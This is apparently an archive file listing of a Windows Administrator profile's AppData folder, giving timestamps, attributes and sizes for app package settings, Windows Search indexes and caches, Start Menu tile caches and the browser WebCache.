2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy/Settings/settings.dat
2021-05-08 08:14:16 ....A         8192          617  Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy/Settings/settings.dat
2025-02-16 10:48:53 ....A         8192          934  Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat
2025-02-16 10:48:53 ..HSA         8192          957  Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/Settings/settings.dat.LOG1
2025-02-16 10:59:22 ....A        49120          750  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/INetCache/MSIMGSIZ.DAT
2025-02-16 11:17:31 ....A           97           97  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Microsoft/Internet Explorer/DOMStore/M9FQX7WM/microsoft.windows[1].xml
2025-02-16 10:52:22 ....A         1960          880  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/Temp/StructuredQuery.log
2025-02-16 10:48:53 ...SA         2684         1327  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache/95d9a2a97a42f02325559b453ba7f8fe839baa18.tbres
2025-02-16 10:48:53 ...SA         2278         1115  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AC/TokenBroker/Cache/fbaf94e759052658216786bfbabcdced1b67a5c2.tbres
2025-02-16 11:17:31 ....A      1572864        19150  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage/CacheStorage.edb
2025-02-16 11:17:31 ....A        16384          328  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage/CacheStorage.jfm
2025-02-16 11:17:31 ....A         8192          385  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edb.chk
2025-02-16 11:17:31 ....A       524288        21405  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/edb.log
2025-02-16 11:17:31 ....A      2097152        27326  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/IndexedDB.edb
2025-02-16 11:17:31 ....A        16384          331  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/IndexedDB.jfm
2025-02-16 10:59:28 ....A        25750         2224  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{18C6F720-ABAE-A6EF-86EC-0E72549F6916}
2025-02-16 10:59:28 ....A        25750        13920  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{8AA47365-B2B3-1961-69EB-F866E376B12F}
2025-02-16 10:59:28 ....A        25750        13920  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{C804BBA7-FA5F-CBF7-8B55-2096E5F972CB}
2025-02-16 10:59:28 ....A        25750        12899  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{8ABD94FB-E7D6-84A6-A997-C918EDDE0AE5}
2025-02-16 10:59:28 ....A        25750         8098  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{923DD477-5846-686B-A659-0FCCD73851A8}
2025-02-16 10:59:28 ....A        25750         7936  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{BB044BFD-25B7-2FAA-22A8-6371A93E0456}
2025-02-16 10:59:28 ....A        25750        10956  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{BD3F924E-55FB-A1BA-9DE6-B50F9F2460AC}
2025-02-16 10:59:28 ....A        25750        10466  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{C1C6F8AC-40A3-0F5C-146F-65A9DC70BBB4}
2025-02-16 10:59:28 ....A        25750         7903  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_AutoGenerated_{DAA168DE-4306-C8BC-8C11-B596240BDDED}
2025-02-16 10:59:28 ....A        25750        10560  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_InternetExplorer_Default
2025-02-16 10:59:28 ....A        25750         3833  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_AdministrativeTools
2025-02-16 10:59:28 ....A        25750         4919  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Computer
2025-02-16 10:59:28 ....A        25750         4282  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_ControlPanel
2025-02-16 10:59:28 ....A        25750         3343  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Explorer
2025-02-16 10:59:28 ....A        25750         8062  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_MediaPlayer32
2025-02-16 10:59:28 ....A        25750         9732  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_RemoteDesktop
2025-02-16 10:59:28 ....A        25750         2458  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_SecHealthUI_cw5n1h2txyewy!SecHealthUI
2025-02-16 10:59:28 ....A        25750         2458  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/windows_immersivecontrolpanel_cw5n1h2txyewy!microsoft_windows_immersivecontrolpanel
2025-02-16 10:59:28 ....A        25750         3900  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/Microsoft_Windows_Shell_RunDialog
2025-02-16 10:59:28 ....A        25750         9334  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/MSEdge
2025-02-16 10:59:28 ....A        25750         7526  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_charmap_exe
2025-02-16 10:59:28 ....A        25750         4045  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_cleanmgr_exe
2025-02-16 10:59:28 ....A        25750         2040  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_cmd_exe
2025-02-16 10:59:28 ....A        25750         9613  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_comexp_msc
2025-02-16 10:59:28 ....A        25750        11603  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_dfrgui_exe
2025-02-16 10:59:28 ....A        25750        13958  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_iscsicpl_exe
2025-02-16 10:59:28 ....A        25750         6144  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_magnify_exe
2025-02-16 10:59:28 ....A        25750         7630  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_MdSched_exe
2025-02-16 10:59:28 ....A        25750         7780  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_msconfig_exe
2025-02-16 10:59:28 ....A        25750         8361  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_msinfo32_exe
2025-02-16 10:59:28 ....A        25750         9336  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_mspaint_exe
2025-02-16 10:59:28 ....A        25750         1469  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_narrator_exe
2025-02-16 10:59:28 ....A        25750        11033  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_notepad_exe
2025-02-16 10:59:28 ....A        25750         8735  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_odbcad32_exe
2025-02-16 10:59:28 ....A        25750         8735  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_odbcad32_exe
2025-02-16 10:59:28 ....A        25750         8359  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_osk_exe
2025-02-16 10:59:28 ....A        25750         8138  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_psr_exe
2025-02-16 10:59:28 ....A        25750         5192  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_RecoveryDrive_exe
2025-02-16 10:59:28 ....A        25750         1015  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_ServerManager_exe
2025-02-16 10:59:28 ....A        25750         4942  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_services_msc
2025-02-16 10:59:28 ....A        25750         6312  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_SnippingTool_exe
2025-02-16 10:59:28 ....A        25750        10947  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_wbadmin_msc
2025-02-16 10:59:28 ....A        25750        14686  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WF_msc
2025-02-16 10:59:28 ....A        25750         8470  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_win32calc_exe
2025-02-16 10:59:28 ....A        25750         3570  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WindowsPowerShell_v1_0_powershell_exe
2025-02-16 10:59:28 ....A        25750         3570  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_WindowsPowerShell_v1_0_powershell_exe
2025-02-16 10:59:28 ....A        25750         3543  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_WindowsPowerShell_v1_0_PowerShell_ISE_exe
2025-02-16 10:59:28 ....A        25750         3543  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{D65231B0-B2F1-4857-A4CE-A8E7C6EA7D27}_WindowsPowerShell_v1_0_PowerShell_ISE_exe
2025-02-16 10:59:28 ....A        25750         7222  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}_xpsrchvw_exe
2025-02-16 10:59:28 ....A        25750         7311  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{6D809377-6AF0-444B-8957-A3773F02200E}_Common Files_Microsoft Shared_Ink_mip_exe
2025-02-16 10:59:28 ....A        25750         7668  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{6D809377-6AF0-444B-8957-A3773F02200E}_Windows NT_Accessories_wordpad_exe
2025-02-16 11:10:47 ....A        25750         3824  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{F38BF404-1D43-42F2-9305-67DE0B28FC23}_AzureArcSetup_ArcSetup_AzureArcSetup_exe
2025-02-16 10:59:28 ....A        25750         3662  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/AppIconCache/125/{F38BF404-1D43-42F2-9305-67DE0B28FC23}_regedit_exe
2025-02-16 11:11:01 ....A        25902         7874  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.0.filtertrie.intermediate.txt
2025-02-16 11:10:47 ....A        25902         7874  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.0.filtertrie.intermediate.txt
2025-02-16 11:11:30 ....A        25902         7874  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.0.filtertrie.intermediate.txt
2025-02-16 11:11:01 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.1.filtertrie.intermediate.txt
2025-02-16 11:10:47 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.1.filtertrie.intermediate.txt
2025-02-16 11:11:30 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.1.filtertrie.intermediate.txt
2025-02-16 10:57:56 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.1.filtertrie.intermediate.txt
2025-02-16 11:11:29 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.1.filtertrie.intermediate.txt
2025-02-16 10:52:23 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.1.filtertrie.intermediate.txt
2025-02-16 11:11:01 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.2.filtertrie.intermediate.txt
2025-02-16 11:10:47 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.2.filtertrie.intermediate.txt
2025-02-16 11:11:30 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.2.filtertrie.intermediate.txt
2025-02-16 10:57:56 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.2.filtertrie.intermediate.txt
2025-02-16 11:11:29 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.2.filtertrie.intermediate.txt
2025-02-16 10:52:23 ....A            5            5  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.2.filtertrie.intermediate.txt
2025-02-16 11:11:01 ....A        34612        10994  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/Apps.ft
2025-02-16 11:10:47 ....A        34612        10994  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/Apps.ft
2025-02-16 11:11:30 ....A        34612        10994  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/Apps.ft
2025-02-16 11:11:01 ....A      1047580       719180  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/Apps.index
2025-02-16 11:10:47 ....A      1047580       719180  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/Apps.index
2025-02-16 11:11:30 ....A      1047580       719180  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/Apps.index
2025-02-16 10:57:56 ....A        25856         7862  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.0.filtertrie.intermediate.txt
2025-02-16 10:57:56 ....A        34548        10967  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/Apps.ft
2025-02-16 11:17:16 ....A     26738688       272002  Administrator/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.dat
2019-07-16 17:11:36 ....A          444          400  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/apps.csg
2019-07-16 17:11:36 ....A          150          150  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/apps.schema
2025-02-16 10:57:56 ....A      1047200       718973  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/Apps.index
2019-07-20 11:08:22 ....A       351728       111904  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appsglobals.txt
2019-07-22 10:30:26 ....A       243494        79691  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appssynonyms.txt
2019-07-16 17:11:36 ....A          454          404  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settings.csg
2019-07-16 17:11:36 ....A          162          162  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settings.schema
2019-07-16 17:11:58 ....A      1425902       433654  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appsconversions.txt
2019-07-16 17:11:58 ....A       532750       164506  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingsconversions.txt
2019-10-15 15:55:46 ....A        44499        16216  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingsglobals.txt
2019-07-22 10:20:36 ....A       103717        26202  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingssynonyms.txt
2025-02-16 11:11:29 ....A       223977        58644  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.0.filtertrie.intermediate.txt
2025-02-16 11:11:29 ....A       245611        92125  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/Settings.ft
2025-02-16 10:52:23 ....A       223522        58460  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.0.filtertrie.intermediate.txt
2025-02-16 10:52:23 ....A       245057        91896  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/Settings.ft
2025-02-16 11:11:29 ....A      1511895       639024  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/Settings.index
2025-02-16 10:48:53 ....A        53651         3845  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765330557646.txt
2025-02-16 10:48:55 ....A        54346         4055  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765352441279.txt
2025-02-16 10:49:02 ....A        54346         4055  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765422158682.txt
2025-02-16 10:57:56 ....A        54587         4132  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841770757745075.txt
2025-02-16 11:10:47 ....A        55696         4198  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778459831441.txt
2025-02-16 11:11:00 ....A        56084         4312  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778606779500.txt
2025-02-16 11:11:30 ....A        56084         4312  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778906549359.txt
2025-02-16 10:52:23 ....A      1509704       638100  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/Settings.index
2025-02-16 11:16:07 ....A        65536        10791  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat
2025-02-16 10:48:52 ..HSA        45056         4788  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat.LOG1
2025-02-16 11:11:29 ....A       700656        85070  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/SettingsCache.txt
2025-02-16 11:12:53 ....A         8296         1986  Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/TempState/CortanaUnifiedTileModelCache.dat
2025-02-16 11:16:06 ....A         8192          935  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat
2025-02-16 10:48:52 ..HSA        16384         1025  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat.LOG1
2025-02-16 11:11:03 ....A         7898         1969  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/StartUnifiedTileModelCache.dat
2025-02-16 10:48:53 ....A        11240          949  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_100_3_PNGEncoded_Header.bin
2025-02-16 10:48:53 ....A       460800        19863  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_100_3_PNGEncoded_Data.bin
